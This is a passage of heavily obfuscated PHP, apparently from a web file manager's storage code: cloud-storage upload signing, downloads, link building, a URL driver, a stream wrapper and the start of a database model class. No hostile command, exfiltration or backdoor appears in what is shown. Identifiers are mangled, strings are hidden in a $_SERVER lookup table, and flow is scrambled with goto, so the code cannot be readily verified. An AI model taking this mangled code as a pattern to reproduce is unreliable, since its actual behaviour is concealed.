$bÌÚï÷ŠçÃ, &$D¢ï¹­†Œ×) { $aÉîÈ¼‰Ò =& $_SERVER[¼€¼ˆ¦‚¡]; $d²§ï­¬ø = array($aÉîÈ¼‰Ò[1270], $aÉîÈ¼‰Ò[1268] . $bÌÚï÷ŠçÃ[$aÉîÈ¼‰Ò[1269]], $aÉîÈ¼‰Ò[1271] . $bÌÚï÷ŠçÃ[$aÉîÈ¼‰Ò[1265]], $aÉîÈ¼‰Ò[138] . $bÌÚï÷ŠçÃ[$aÉîÈ¼‰Ò[1266]]); $CØ—÷ŠÀà = $this->ussRequest($A¤°Æğ™ğš, $aÉîÈ¼‰Ò[214], $D¢ï¹­†Œ×, $d²§ï­¬ø); return !$CØ—÷ŠÀà[$aÉîÈ¼‰Ò[1031]] ? $CØ—÷ŠÀà[$aÉîÈ¼‰Ò[1031]] : $CØ—÷ŠÀà[$aÉîÈ¼‰Ò[1033]]; } public function uploadFormData($CæÊ˜ôäõ—, $fƒÎµä¾‰¬ = 3600) { return $this->uploadPolicy($CæÊ˜ôäõ—, $fƒÎµä¾‰¬); } public function multiUploadFormData($Fæ×¶ÊóœØ, $BÉ‰…“„Òô = 3600) { $bì‘Ì¦Œø‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $C­¢¡¹¼²½ = (int) $GLOBALS[$bì‘Ì¦Œø‚[7]][$bì‘Ì¦Œø‚[77]]; return $this->uploadPolicy($Fæ×¶ÊóœØ, $BÉ‰…“„Òô, $C­¢¡¹¼²½); } private function uploadPolicy($FãÒ²¯œƒè, $e²¸©º©´» = 3600, $E´‰›äç· = 0) { goto F¨ÁòÕùµ¿; F¨ÁòÕùµ¿: $C¯Â£ĞÑì =& $_SERVER[¼€¼ˆ¦‚¡]; $CÚ¡‚¸Îàˆ = $C¯Â£ĞÑì[8] . $this->bucket; $aÊ‹ï‹øÓ = gmdate($C¯Â£ĞÑì[1205]); goto b…ÌŞ–ÒÊµ; eÚØİ»ª²¹: $CŞÚÇÖª¦¸ = base64_encode(hash_hmac($C¯Â£ĞÑì[1242], "\120\x4f\123\x54\x26{$CÚ¡‚¸Îàˆ}\46{$aÊ‹ï‹øÓ}\46{$B–ã„Í…Ş}", md5("{$this->userpass}"), !0)); $e©‰ÖŞ‰Ùğ = array($C¯Â£ĞÑì[1112] => $B–ã„Í…Ş, $C¯Â£ĞÑì[1276] => "\125\x50\131\125\x4e\x20{$this->username}\x3a{$CŞÚÇÖª¦¸}", $C¯Â£ĞÑì[169] => $this->endpoint . $CÚ¡‚¸Îàˆ); return $e©‰ÖŞ‰Ùğ; goto eâ„ŠÖßô; b…ÌŞ–ÒÊµ: $E³…½¨ÒŞ = array($C¯Â£ĞÑì[1272] => $this->bucket, $C¯Â£ĞÑì[1273] => $FãÒ²¯œƒè, $C¯Â£ĞÑì[1274] => time() + $e²¸©º©´», $C¯Â£ĞÑì[1275] => $aÊ‹ï‹øÓ); if ($E´‰›äç·) { $E³…½¨ÒŞ[$C¯Â£ĞÑì[1191]] = $E´‰›äç·; } $B–ã„Í…Ş = base64_encode(json_encode($E³…½¨ÒŞ)); goto eÚØİ»ª²¹; eâ„ŠÖßô: } public function download($Cøí‡‡ÏĞ¢, $d«ãøÔÂŸá) { goto Dàƒ£ß¦“Î; Dàƒ£ß¦“Î: $e”“Ğááßå = IO::getPathInner(IO::mkfile($d«ãøÔÂŸá)); if (!($CŒÂ¼Øô‚Š = $this->link($Cøí‡‡ÏĞ¢))) { return !1; } $D‚Ğ‹¡±òí = 0; goto A…ÍöîÆ™Ê; A…ÍöîÆ™Ê: $FŒ¨ì¶œÉÎ = 1024 * 200; $c Î‡¿Ö‰ˆ = fopen($e”“Ğááßå, $_SERVER[¼€¼ˆ¦‚¡][1226]); while (!0) { $bÖ´ôÂ†‹á = $this->fileSubstr($Cøí‡‡ÏĞ¢, $D‚Ğ‹¡±òí, $FŒ¨ì¶œÉÎ); if ($bÖ´ôÂ†‹á === !1) { return !1; } fwrite($c Î‡¿Ö‰ˆ, $bÖ´ôÂ†‹á); $D‚Ğ‹¡±òí += $FŒ¨ì¶œÉÎ; if (strlen($bÖ´ôÂ†‹á) < $FŒ¨ì¶œÉÎ) { break; } } goto C„äÎœµŒ˜; C„äÎœµŒ˜: fclose($c Î‡¿Ö‰ˆ); return $d«ãøÔÂŸá; goto A¬©Ô„ê«; A¬©Ô„ê«: } public function link($AÄ†æ«Œò, $a˜…ÀÔóĞ = array()) { $A¨Ã¤ßïÔÊ =& $_SERVER[¼€¼ˆ¦‚¡]; $AÄ†æ«Œò = trim($AÄ†æ«Œò, $A¨Ã¤ßïÔÊ[8]); if (!empty($this->token)) { $eÃÁÏ­Ôà = strtotime(date($A¨Ã¤ßïÔÊ[1277])); $eê³¶‰•ÏË = substr(md5($this->token . $A¨Ã¤ßïÔÊ[272] . $eÃÁÏ­Ôà . $A¨Ã¤ßïÔÊ[1278] . $AÄ†æ«Œò), 12, 8) . $eÃÁÏ­Ôà; $a˜…ÀÔóĞ[] = $A¨Ã¤ßïÔÊ[1279] . $eê³¶‰•ÏË; } $e·ÇãçŸìÎ = !empty($a˜…ÀÔóĞ) ? $A¨Ã¤ßïÔÊ[69] . implode($A¨Ã¤ßïÔÊ[272], $a˜…ÀÔóĞ) : $A¨Ã¤ßïÔÊ[33]; return $this->getHost() . $A¨Ã¤ßïÔÊ[8] . $AÄ†æ«Œò . $e·ÇãçŸìÎ; } public function fileOut($A² Ã‡¦·Á, $F¹ïƒ“Å”Ü = false, $BÏïªÒÎéğ = false, $c˜êñì®ù‰ = '') { if (!$BÏïªÒÎéğ) { $BÏïªÒÎéğ = $this->pathThis($A² Ã‡¦·Á); } $A›ß†‹å‚ = $F¹ïƒ“Å”Ü ? array($_SERVER[¼€¼ˆ¦‚¡][1280] . rawurlencode($BÏïªÒÎéğ)) : array(); $DÑéó¡ÑºÓ = $this->link($A² Ã‡¦·Á, $A›ß†‹å‚); $this->fileOutLink($DÑéó¡ÑºÓ); } public function fileOutServer($cç§ø¾ì‚Ù, $e¾½ßÉƒá = false, $E©âŸŒòï¾ = false, $DÜŒõ¼¥ˆö = '') { parent::fileOut($cç§ø¾ì‚Ù, $e¾½ßÉƒá, $E©âŸŒòï¾, $DÜŒõ¼¥ˆö); } public function fileOutImage($B«‘ã›²ìÜ, $aĞ¸÷ØÎ…Ï = 250) { $a‹Õƒ¿ïŸº = $this->link($B«‘ã›²ìÜ . $_SERVER[¼€¼ˆ¦‚¡][1281] . $aĞ¸÷ØÎ…Ï); $this->fileOutLink($a‹Õƒ¿ïŸº); } public function fileOutImageServer($AŒË’ÌîçÃ, $f­Ìœø¡³ = 250) { parent::fileOutImage($AŒË’ÌîçÃ, $f­Ìœø¡³); } public function hashMd5($Eã„³‚³Åñ) { $cï‹ÎªÑ‹ê =& $_SERVER[¼€¼ˆ¦‚¡]; $aÏèîÂ¯ù = $this->objectMeta($Eã„³‚³Åñ); return isset($aÏèîÂ¯ù[$cï‹ÎªÑ‹ê[196]]) ? $aÏèîÂ¯ù[$cï‹ÎªÑ‹ê[196]] : !1; } public function size($B‚°ÚöˆŒ£) { $a¡‚‘ª‹…› = $this->objectMeta($B‚°ÚöˆŒ£); return $a¡‚‘ª‹…› ? $a¡‚‘ª‹…›[$_SERVER[¼€¼ˆ¦‚¡][77]] : 0; } public function info($a¦ÎàÔŸ‰Î) { if ($this->isFolder($a¦ÎàÔŸ‰Î)) { return $this->folderInfo($a¦ÎàÔŸ‰Î); } else { if ($this->isFile($a¦ÎàÔŸ‰Î)) { return $this->fileInfo($a¦ÎàÔŸ‰Î); } } return !1; } public function exist($eíÆ©â¬²‡) { return $this->isFile($eíÆ©â¬²‡) || $this->isFolder($eíÆ©â¬²‡); } public function isFile($E®å›½‚Ø¿) { return !$this->isFolder($E®å›½‚Ø¿) && $this->objectMeta($E®å›½‚Ø¿); } public function isFolder($DŞµ±½Á›œ) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][223], $DŞµ±½Á›œ); } protected function objectMeta($EÒ°ğ†É¶) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][224], $EÒ°ğ†É¶); } protected function _objectMeta($d›ÙÃõ’Öä) { goto Fí§ ï£ğ; D‘«–˜×‡Œ: if (!$DÏÜ†Éİ[$EÃ«˜É°[1031]]) { return null; } $aµ­±‘çì = isset($DÏÜ†Éİ[$EÃ«˜É°[1033]]) ? $DÏÜ†Éİ[$EÃ«˜É°[1033]] : array(); if (!isset($aµ­±‘çì[$EÃ«˜É°[1283]])) { return null; } goto BÄğ‚÷è¥ß; BÄğ‚÷è¥ß: $AÖ«äË‰çĞ = array($EÃ«˜É°[28] => get_path_this($d›ÙÃõ’Öä), $EÃ«˜É°[29] => isset($aµ­±‘çì[$EÃ«˜É°[1283]]) ? $aµ­±‘çì[$EÃ«˜É°[1283]] : null, $EÃ«˜É°[77] => isset($aµ­±‘çì[$EÃ«˜É°[1284]]) ? $aµ­±‘çì[$EÃ«˜É°[1284]] : null, $EÃ«˜É°[196] => isset($aµ­±‘çì[$EÃ«˜É°[1285]]) ? $aµ­±‘çì[$EÃ«˜É°[1285]] : null, $EÃ«˜É°[1253] => isset($aµ­±‘çì[$EÃ«˜É°[1286]]) ? $aµ­±‘çì[$EÃ«˜É°[1286]] : null); $AÖ«äË‰çĞ[$EÃ«˜É°[1254]] = isset($aµ­±‘çì[$EÃ«˜É°[1287]]) ? strtotime($aµ­±‘çì[$EÃ«˜É°[1287]]) : $AÖ«äË‰çĞ[$EÃ«˜É°[1253]]; return $AÖ«äË‰çĞ; goto dĞó›öĞ; Fí§ ï£ğ: $EÃ«˜É° =& $_SERVER[¼€¼ˆ¦‚¡]; if ($d›ÙÃõ’Öä == $EÃ«˜É°[33] || $d›ÙÃõ’Öä == $EÃ«˜É°[8]) { return array(); } $DÏÜ†Éİ = $this->ussRequest($d›ÙÃõ’Öä, $EÃ«˜É°[1282]); goto D‘«–˜×‡Œ; dĞó›öĞ: } protected function _isFolder($FÎºœ“Õâê) { $BÅ°ïƒÀï =& $_SERVER[¼€¼ˆ¦‚¡]; if ($FÎºœ“Õâê == $BÅ°ïƒÀï[33] || $FÎºœ“Õâê == $BÅ°ïƒÀï[8]) { return !0; } $f³ÖÜ«½Ïœ = $this->objectMeta($FÎºœ“Õâê); return isset($f³ÖÜ«½Ïœ[$BÅ°ïƒÀï[29]]) && $f³ÖÜ«½Ïœ[$BÅ°ïƒÀï[29]] == $BÅ°ïƒÀï[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($B˜×á§‚·ã = false) { } public function exist($dé­İ»Š‰ñ) { $AõòÕ•õ¦Ø = $this->info($dé­İ»Š‰ñ); return $AõòÕ•õ¦Ø[$_SERVER[¼€¼ˆ¦‚¡][188]]; } public function isFile($A¶„Ç¬á”) { $D±˜Ÿ±à†‰ = $this->info($A¶„Ç¬á”); return $D±˜Ÿ±à†‰[$_SERVER[¼€¼ˆ¦‚¡][188]]; } public function isFolder($fÉÏê‰´‰ö) { return !1; } public function size($DÅ‚„³‚Ê) { $CÅÂ­Â—¯Î = $this->info($DÅ‚„³‚Ê); return $CÅÂ­Â—¯Î[$_SERVER[¼€¼ˆ¦‚¡][77]]; } public function info($DâÒœ®àôò) { return $this->infoParse($DâÒœ®àôò); } public function infoAuth($Bó©¨Åí‚²) { return $this->infoParse($Bó©¨Åí‚²); } public function infoWithChildren($a¼£ëÍ»ƒ) { return $this->infoParse($a¼£ëÍ»ƒ); } public function infoFull($D’©³Šï×°) { return $this->infoParse($D’©³Šï×°); } private function infoParse($Döã„í¡ºŒ) { $döÂÔÃÓİ =& $_SERVER[¼€¼ˆ¦‚¡]; $c«ë‚“œ½¼ = $this->header($Döã„í¡ºŒ); if (!$c«ë‚“œ½¼ || !$c«ë‚“œ½¼[$döÂÔÃÓİ[685]]) { return !1; } $bÃ¬ÜÓÃÎµ = _get($c«ë‚“œ½¼, $döÂÔÃÓİ[325], 0); $cÍ†¥£ïÕ = array($döÂÔÃÓİ[28] => $c«ë‚“œ½¼[$döÂÔÃÓİ[28]], $döÂÔÃÓİ[75] => $Döã„í¡ºŒ, $döÂÔÃÓİ[29] => $döÂÔÃÓİ[167], $döÂÔÃÓİ[77] => intval($bÃ¬ÜÓÃÎµ), $döÂÔÃÓİ[160] => get_path_ext($c«ë‚“œ½¼[$döÂÔÃÓİ[28]]), $döÂÔÃÓİ[1162] => $bÃ¬ÜÓÃÎµ > 0 && $c«ë‚“œ½¼[$döÂÔÃÓİ[1288]], $döÂÔÃÓİ[1163] => !1); return $cÍ†¥£ïÕ; } private function header($FÃÌòÎæø¿) { if (isset(self::$_cacheHeader[$FÃÌòÎæø¿])) { return self::$_cacheHeader[$FÃÌòÎæø¿]; } self::$_cacheHeader[$FÃÌòÎæø¿] = url_header($FÃÌòÎæø¿); return self::$_cacheHeader[$FÃÌòÎæø¿]; } public function hashSimple($f¨Ö÷ÃÃìª, $a½»®§ä™ = false) { goto a­–øã‚‘æ; D³‰Ø‚É«Ï: $aÔ‰Ğ‹Ë†– = $C¹„©ŠïŒ†[$bù‡Ï¡¬šË[77]]; $Då²õŸ‰Õª = 200; $Bãè¦õô = 50; goto dÑ‘Á¤˜×ˆ; dÑ‘Á¤˜×ˆ: if ($aÔ‰Ğ‹Ë†– <= $Då²õŸ‰Õª * $Bãè¦õô) { return md5($this->fileSubstr($f¨Ö÷ÃÃìª, 0, $aÔ‰Ğ‹Ë†–)) . $aÔ‰Ğ‹Ë†–; } $dß™ëÖæ = intval($aÔ‰Ğ‹Ë†– / $Bãè¦õô); $ağÌ†§‘Ó½ = $bù‡Ï¡¬šË[33]; goto E ¹Ÿ‹ÕÇÖ; fÏÇµÑî™õ: $ağÌ†§‘Ó½ .= $this->fileSubstr($f¨Ö÷ÃÃìª, $aÔ‰Ğ‹Ë†– - $Då²õŸ‰Õª, $Då²õŸ‰Õª); return md5($ağÌ†§‘Ó½) . $aÔ‰Ğ‹Ë†–; goto AºŒôªˆó; a­–øã‚‘æ: $bù‡Ï¡¬šË =& $_SERVER[¼€¼ˆ¦‚¡]; $C¹„©ŠïŒ† = $this->info($f¨Ö÷ÃÃìª); if (!$C¹„©ŠïŒ† || !$C¹„©ŠïŒ†[$bù‡Ï¡¬šË[188]]) { return !1; } goto D³‰Ø‚É«Ï; E ¹Ÿ‹ÕÇÖ: $EÑŠ£à‚…Û = timeFloat(); $aàÜ‰ = 15; for ($EİÏÖâ°õâ = 0; $EİÏÖâ°õâ < $Bãè¦õô; $EİÏÖâ°õâ++) { if (timeFloat() - $EÑŠ£à‚…Û > $aàÜ‰) { return !1; } $FÖÆÀ–í˜™ = $this->fileSubstr($f¨Ö÷ÃÃìª, $dß™ëÖæ * $EİÏÖâ°õâ, $Då²õŸ‰Õª); if (!$FÖÆÀ–í˜™) { return !1; } $ağÌ†§‘Ó½ .= $FÖÆÀ–í˜™; } goto fÏÇµÑî™õ; AºŒôªˆó: } public function getContent($Fîóµ÷É—) { return $this->fileSubstr($Fîóµ÷É—); } public function fileSubstr($C‚Ÿ£±šã½, $Dáñƒ¤ªš = 0, $b¤¬óŠİÅ’ = -1) { goto d²èÓÜ¹™î; E¤ÇÒ…êÖ¾: if ($b¤¬óŠİÅ’ === -1) { $b¤¬óŠİÅ’ = $A…“ÃĞÆÀ˜[$E¦»½áô¸[77]]; } if ($b¤¬óŠİÅ’ == 0) { return $E¦»½áô¸[33]; } $C¨æĞìªãÄ = array($E¦»½áô¸[1289] . $Dáñƒ¤ªš . $E¦»½áô¸[712] . ($Dáñƒ¤ªš + $b¤¬óŠİÅ’ - 1)); goto A©‡Î¦ğ›ô; A©‡Î¦ğ›ô: $Bš¦‘è– = url_request($C‚Ÿ£±šã½, $E¦»½áô¸[216], !1, $C¨æĞìªãÄ, !1, !1, 1); return $Bš¦‘è–[$E¦»½áô¸[1033]] ? $Bš¦‘è–[$E¦»½áô¸[1033]] : $E¦»½áô¸[33]; goto B¢àÀÏ†Àî; d²èÓÜ¹™î: $E¦»½áô¸ =& $_SERVER[¼€¼ˆ¦‚¡]; $A…“ÃĞÆÀ˜ = $this->info($C‚Ÿ£±šã½); if (!$A…“ÃĞÆÀ˜ || !$A…“ÃĞÆÀ˜[$E¦»½áô¸[188]] && $A…“ÃĞÆÀ˜[$E¦»½áô¸[77]] > 1024 * 1024 * 10) { return !1; } goto E¤ÇÒ…êÖ¾; B¢àÀÏ†Àî: } public function download($Fñ®£Ü‰’‡, $A Í±¯ïÍ¥) { Downloader::start($Fñ®£Ü‰’‡, $A Í±¯ïÍ¥); return $A Í±¯ïÍ¥; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($B™ƒ”ºœ’Ó, $BòÅÄÊõÎ = '') { goto e­¨ÉïÚİ; E•ïç¶Áß: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$B™ƒ”ºœ’Ó])) { self::$_chunkBuffer[$B™ƒ”ºœ’Ó] = array(); } goto eÑ“Ğù£ÁŞ; e­¨ÉïÚİ: $this->info = $this->info($B™ƒ”ºœ’Ó); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¼€¼ˆ¦‚¡][75]]; goto E•ïç¶Áß; eÑ“Ğù£ÁŞ: return $this->info ? !0 : !1; goto Føà‘Ï™ª…; Føà‘Ï™ª…: } function stream_read($fØ¿î³‡¨Ò) { $cƒèİÀ”Êö = $this->fileSubstr($this->pose, $fØ¿î³‡¨Ò); $this->pose += strlen($cƒèİÀ”Êö); return $cƒèİÀ”Êö; } public function stream_tell() { return $this->pose; } public function stream_seek($D„³Èà·‘œ, $F°™¶ëóÒ÷) { $AéÚŒ‹©ïã =& $_SERVER[¼€¼ˆ¦‚¡]; if ($F°™¶ëóÒ÷ == SEEK_SET) { $this->pose = $D„³Èà·‘œ; } else { if ($F°™¶ëóÒ÷ == SEEK_CUR) { $this->pose += $D„³Èà·‘œ; } else { if ($F°™¶ëóÒ÷ == SEEK_END) { $this->pose = $this->info[$AéÚŒ‹©ïã[77]] + intval($D„³Èà·‘œ); } } } if ($D„³Èà·‘œ < 0) { $this->pose = $this->info[$AéÚŒ‹©ïã[77]] + $D„³Èà·‘œ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¼€¼ˆ¦‚¡][77]]; } public function stream_close() { return !0; } public function url_stat($cÜ˜ùë‚İ, $aË¥È„Ï´¦) { $ağè”óä¦¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $a†±ó„Èôó = $this->info($cÜ˜ùë‚İ); return array($ağè”óä¦¯[1290] => 0, $ağè”óä¦¯[1291] => 0, $ağè”óä¦¯[12] => 32768 + 511, $ağè”óä¦¯[1292] => 0, $ağè”óä¦¯[1293] => 0, $ağè”óä¦¯[1294] => 0, $ağè”óä¦¯[1295] => 0, $ağè”óä¦¯[77] => $a†±ó„Èôó[$ağè”óä¦¯[77]], $ağè”óä¦¯[1296] => $a†±ó„Èôó[$ağè”óä¦¯[1168]], $ağè”óä¦¯[1254] => $a†±ó„Èôó[$ağè”óä¦¯[107]], $ağè”óä¦¯[1253] => $a†±ó„Èôó[$ağè”óä¦¯[187]], $ağè”óä¦¯[1297] => 0, $ağè”óä¦¯[1298] => 0); } static $fileInfo = array(); public function info($E½À–ÏŠàğ) { $fÔ£Òñ”ÏÃ = $_SERVER[¼€¼ˆ¦‚¡][1299]; if (isset(self::$fileInfo[$E½À–ÏŠàğ])) { return self::$fileInfo[$E½À–ÏŠàğ]; } if (substr($E½À–ÏŠàğ, 0, strlen($fÔ£Òñ”ÏÃ)) != $fÔ£Òñ”ÏÃ) { return !1; } self::$fileInfo[$E½À–ÏŠàğ] = IO::info(substr($E½À–ÏŠàğ, strlen($fÔ£Òñ”ÏÃ))); return self::$fileInfo[$E½À–ÏŠàğ]; } public static function read($c•Şå×á÷Ü, $BöÉ“ÂÕğº, $A®ñ“è†Ì) { goto Aé›™íÚÊº; dá·­Áó¦¤: $AÛ“î¢Ğ¤½ = 0; while ($AÛ“î¢Ğ¤½ < $A®ñ“è†Ì) { $A¢÷ˆ™“¸œ = min($Cİ†¶ÑÙÅ, $A®ñ“è†Ì - $AÛ“î¢Ğ¤½); $A¡šÉñ«âˆ .= fread($aÎÔ¢Ôæè, $A¢÷ˆ™“¸œ); $AÛ“î¢Ğ¤½ += $A¢÷ˆ™“¸œ; } fclose($aÎÔ¢Ôæè); goto eÛ’µ­îˆ; bëäò¸ŸÒ‡: $Cİ†¶ÑÙÅ = 8192; fseek($aÎÔ¢Ôæè, $BöÉ“ÂÕğº, SEEK_SET); $A¡šÉñ«âˆ = $dÀ—Œêø¤Ì[33]; goto dá·­Áó¦¤; eÛ’µ­îˆ: return $A¡šÉñ«âˆ; goto cË·ÃÇÈ¿œ; Aé›™íÚÊº: $dÀ—Œêø¤Ì =& $_SERVER[¼€¼ˆ¦‚¡]; $aÎÔ¢Ôæè = fopen($c•Şå×á÷Ü, $dÀ—Œêø¤Ì[1170]); if (!$aÎÔ¢Ôæè) { return $dÀ—Œêø¤Ì[33]; } goto bëäò¸ŸÒ‡; cË·ÃÇÈ¿œ: } public function fileSubstr($BåÏÁÖ¯„, $A¨Æº´Äã) { goto fËÊì¶…¿; AŠ‘ÎÂéˆÇ: $EÍî…Ô–† = 0; $Eªš¸È‰ÕŸ = 0; $d‹Ô°è±ÏŞ = $bíœ¬Ûëˆ[33]; goto b³ŠéÎ¡Œí; dˆÊáäÉŠ: if ($BåÏÁÖ¯„ + $A¨Æº´Äã > $BïÎÉè½š) { $A¨Æº´Äã = $BïÎÉè½š - $BåÏÁÖ¯„; } if ($A¨Æº´Äã <= 0) { return $bíœ¬Ûëˆ[33]; } if ($BåÏÁÖ¯„ < 0 || $BåÏÁÖ¯„ >= $BïÎÉè½š || $A¨Æº´Äã <= 0 || $A¨Æº´Äã > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\x69\x6c\145\x52\x65\141\144\40\145\x72\162\x6f\x72\x21\x20\x73\164\141\162\x74\x3d{$BåÏÁÖ¯„}\x3b\154\x65\x6e\147\x74\150\75{$A¨Æº´Äã}\x3b\40\163\x69\x7a\145\75{$BïÎÉè½š}\73"); } goto E•Ğ¤Ó•®»; E•Ğ¤Ó•®»: $Bå’ÖÉó˜ = 64 * 1024; $dµ—ÏÏİˆ =& self::$_chunkBuffer[$this->path]; if (!$dµ—ÏÏİˆ) { $dµ—ÏÏİˆ = array(); } goto AŠ‘ÎÂéˆÇ; fËÊì¶…¿: $bíœ¬Ûëˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $BïÎÉè½š = $this->info[$bíœ¬Ûëˆ[77]]; $EÍÓàî« = $BåÏÁÖ¯„; goto AÆËø‡Ÿ¦Í; b³ŠéÎ¡Œí: foreach ($dµ—ÏÏİˆ as $EÍî…Ô–† => $d‹Ô°è±ÏŞ) { $EÍî…Ô–† = intval($EÍî…Ô–†); $Eªš¸È‰ÕŸ = $EÍî…Ô–† + strlen($d‹Ô°è±ÏŞ); if ($BåÏÁÖ¯„ >= $Eªš¸È‰ÕŸ) { continue; } if ($BåÏÁÖ¯„ >= $EÍî…Ô–† && $BåÏÁÖ¯„ + $A¨Æº´Äã <= $Eªš¸È‰ÕŸ) { return substr($d‹Ô°è±ÏŞ, $BåÏÁÖ¯„ - $EÍî…Ô–†, $A¨Æº´Äã); } break; } if (count($dµ—ÏÏİˆ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($bíœ¬Ûëˆ[1300], $bíœ¬Ûëˆ[1301] . count($dµ—ÏÏİˆ) . "\x3b\x73\x74\x61\x72\x74\x3d{$BåÏÁÖ¯„}\x2c\x6c\x65\x6e\147\x74\150\75{$A¨Æº´Äã}\x3b\x70\x6f\163\x65\72{$EÍî…Ô–†}\x7e{$Eªš¸È‰ÕŸ}"); throw new Exception($bíœ¬Ûëˆ[1302]); } $D£øâİŒç = intval($BåÏÁÖ¯„ / $Bå’ÖÉó˜) * $Bå’ÖÉó˜; goto dØÈÃĞÔÄ; AÆËø‡Ÿ¦Í: $FĞÍ’¶º‘µ = $A¨Æº´Äã; if ($BåÏÁÖ¯„ < 0) { $BåÏÁÖ¯„ = $BïÎÉè½š + $BåÏÁÖ¯„; } if ($A¨Æº´Äã === !1) { $A¨Æº´Äã = $BïÎÉè½š - $BåÏÁÖ¯„; } goto dˆÊáäÉŠ; fóò§´î®¸: ksort($dµ—ÏÏİˆ); $dÙ¤‰¯ºŞ = substr($E¿Û‹„„¿„, $BåÏÁÖ¯„ - $D£øâİŒç, $A¨Æº´Äã); return $dÙ¤‰¯ºŞ; goto C±¼¤Ãæ·è; dØÈÃĞÔÄ: $E¢†Ù™Óˆá = ceil(($BåÏÁÖ¯„ + $A¨Æº´Äã) / $Bå’ÖÉó˜) * $Bå’ÖÉó˜ - $D£øâİŒç; $E¿Û‹„„¿„ = IO::fileSubstr($this->path, $D£øâİŒç, $E¢†Ù™Óˆá); $dµ—ÏÏİˆ[$D£øâİŒç . $bíœ¬Ûëˆ[33]] = $E¿Û‹„„¿„; goto fóò§´î®¸; C±¼¤Ãæ·è: } private function log($CØ’¦°¬¯Õ, $DœÌ‚ š) { $eÂ´§˜¨ìŞ =& $_SERVER[¼€¼ˆ¦‚¡]; $bºÉ·ƒé‘º = timeFloat() - $this->timeStart; write_log(sprintf($eÂ´§˜¨ìŞ[1303], $CØ’¦°¬¯Õ, $this->info[$eÂ´§˜¨ìŞ[28]], $bºÉ·ƒé‘º, $DœÌ‚ š), $eÂ´§˜¨ìŞ[1219]); } } goto cĞ¢×ÖóŒ¾; E©£¸’ÀêÃ: define($_SERVER[¼€¼ˆ¦‚¡][230], 0); define($_SERVER[¼€¼ˆ¦‚¡][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\157\162\x64\145\162", "\x61\154\x69\x61\163", "\150\141\166\x69\156\147", "\147\x72\157\x75\160", "\154\x6f\x63\x6b", "\144\151\163\164\x69\x6e\143\164", "\141\x75\x74\x6f", "\x66\x69\x6c\x74\145\162", "\166\x61\154\x69\144\x61\x74\145", "\x72\x65\x73\x75\154\x74", "\142\x69\x6e\144", "\x74\157\x6b\x65\156"); public function __construct($c½¡‡Ë‡áÉ = '', $EÑĞİŠŒ©† = '', $e™–ÀİßñÍ = '') { $AÓÁ±Æ‚·Ø =& $_SERVER[¼€¼ˆ¦‚¡]; $this->_initialize(); if (!empty($c½¡‡Ë‡áÉ)) { if (strpos($c½¡‡Ë‡áÉ, $AÓÁ±Æ‚·Ø[91])) { list($this->dbName, $this->name) = explode($AÓÁ±Æ‚·Ø[91], $c½¡‡Ë‡áÉ); } else { $this->name = $c½¡‡Ë‡áÉ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($EÑĞİŠŒ©†)) { $this->tablePrefix = $AÓÁ±Æ‚·Ø[33]; } elseif ($AÓÁ±Æ‚·Ø[33] != $EÑĞİŠŒ©†) { $this->tablePrefix = $EÑĞİŠŒ©†; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($AÓÁ±Æ‚·Ø[232]); } $this->db(0, empty($this->connection) ? $e™–ÀİßñÍ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Fì¬Ê½Á =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($this->fields)) { if (think_config($Fì¬Ê½Á[233])) { $E˜İÚå¯È = $this->dbName ? $this->dbName : think_config($Fì¬Ê½Á[234]); $Fè·÷÷…»å = think_var_cache($Fì¬Ê½Á[235] . strtolower(get_path_this($E˜İÚå¯È) . $Fì¬Ê½Á[91] . $this->name)); if ($Fè·÷÷…»å) { $AØ­¡ë½¬ç = think_config($Fì¬Ê½Á[236]); if (empty($AØ­¡ë½¬ç) || $Fè·÷÷…»å[$Fì¬Ê½Á[237]] == $AØ­¡ë½¬ç) { $this->fields = $Fè·÷÷…»å; return; } } } $this->flush(); } } public function flush() { goto cÇ¯íÆÑÀÁ; bíÊ™ŠÉè: if (!$B»±âêÚ) { return !1; } $this->fields = array_keys($B»±âêÚ); $this->fields[$Cº¾ØŠ‰äİ[238]] = !1; goto bì»ù³çö; cÇ¯íÆÑÀÁ: $Cº¾ØŠ‰äİ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->db->setModel($this->name); $B»±âêÚ = $this->db->getFields($this->getTableName()); goto bíÊ™ŠÉè; CœéÉ‡•‚: if (think_config($Cº¾ØŠ‰äİ[233])) { $Eì‰½‘È¹« = $this->dbName ? $this->dbName : think_config($Cº¾ØŠ‰äİ[234]); think_var_cache($Cº¾ØŠ‰äİ[235] . strtolower(get_path_this($Eì‰½‘È¹«) . $Cº¾ØŠ‰äİ[91] . $this->name), $this->fields); } goto C–’¾ŞÊ¦; bì»ù³çö: foreach ($B»±âêÚ as $b²¾­ÄÓ‘´ => $A–Úè¼‘š) { $b÷Ù¹ğ¹ğ[$b²¾­ÄÓ‘´] = $A–Úè¼‘š[$Cº¾ØŠ‰äİ[29]]; if ($A–Úè¼‘š[$Cº¾ØŠ‰äİ[36]]) { $this->fields[$Cº¾ØŠ‰äİ[239]] = 